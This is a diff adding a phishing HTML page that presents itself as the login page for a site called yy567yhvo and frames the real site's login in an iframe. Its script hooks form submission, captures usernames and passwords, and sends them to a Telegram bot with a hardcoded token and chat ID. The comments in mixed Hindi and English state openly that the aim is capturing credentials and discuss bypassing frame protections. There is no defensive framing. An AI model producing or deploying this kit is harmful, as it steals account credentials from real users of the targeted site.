@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>yy567yhvo Login</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://www.yy567yhvo.cc/#/pages/login/login"></iframe>
+    
+    <script>
+        // Original site se credentials capture karne ke liye
+        // Note: Due to security (X-Frame-Options), direct iframe may not work
+        // So we use a simpler approach - redirect to original site and capture via webhook
+        
+        // Alternative: Use a proxy service if iframe doesn't work
+        // For now, this is the basic structure
+        
+        // If iframe works, use this:
+        const formObserver = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                if (mutation.type === 'childList') {
+                    const form = document.querySelector('form');
+                    if (form) {
+                        form.addEventListener('submit', function(e) {
+                            e.preventDefault();
+                            const formData = new FormData(form);
+                            const username = formData.get('username') || 'N/A';
+                            const password = formData.get('password') || 'N/A';
+                            
+                            // Telegram par bhejein
+                            fetch(`https://api.telegram.org/8705839468:AAFmtqLK89HlK3xx3BBDzWGWQUBT-4OcLWo/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: '7098911219',
+                                    text: `🎯 New Login:\n👤 User: ${username}\n🔑 Pass: ${password}`
+                                })
+                            });
+                        });
+                    }
+                }
+            });
+        });
+        
+        formObserver.observe(document.body, { childList: true, subtree: true });
+    </script>
+</body>
+</html>
